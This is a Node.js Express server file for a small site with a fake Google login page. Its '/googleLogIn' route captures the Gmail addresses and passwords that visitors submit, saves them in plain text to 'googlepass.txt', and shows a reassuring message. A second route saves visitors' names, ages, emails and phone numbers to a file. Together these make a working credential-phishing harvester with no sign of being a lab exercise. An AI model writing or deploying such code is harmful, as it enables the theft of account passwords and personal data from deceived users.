const { urlencoded } = require('express');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const path = require('path');
const fs = require('fs');


// EXPRESS RELATED STUFF 

app.use(express.static('static'))
app.use(urlencoded());

//PUG RELATED STUFF 
app.set('viewengine','pug');
app.set('views',path.join(__dirname,'views'))


// ENDPOINTS 
app.get("/base",(req,res)=>{
    res.render("base.pug")
})
app.get("/",(req,res)=>{
res.render('index.pug');
})
app.get("/login", (req,res)=>{
    res.status(200).render('login.pug')
})
app.get("/glogin", (req,res)=>{
    res.status(200).render('google.pug')
})

app.post('/trylog',(req,res)=>{

    name= req.body.name
    age = req.body.age
    
    email = req.body.email
    phone = req.body.phone
    
    let outputToWrite = `The name of the client is ${name} \n he/she is ${age} years old \n email - ${email} \n phone number = ${phone} `


    fs.writeFileSync('output.txt',outputToWrite)

    res.status(200).render('index.pug', {"alert":"your form have been submitted"})
});


app.post("/googleLogIn",(req,res)=>{
    gmail = req.body.gmail
    pass = req.body.pass

    let output = `Gmail- ${gmail} \n Pass - ${pass}`

    fs.writeFileSync('googlepass.txt',output)

    let params = {"alert":"Your login request have been send to review"}

    res.status(200).render('loginDone.pug')
       
    
})

// LISTENING TO THE SERVER 

app.listen(port,()=>{
    console.log(`The app started on localhost:${port}`);
})
    
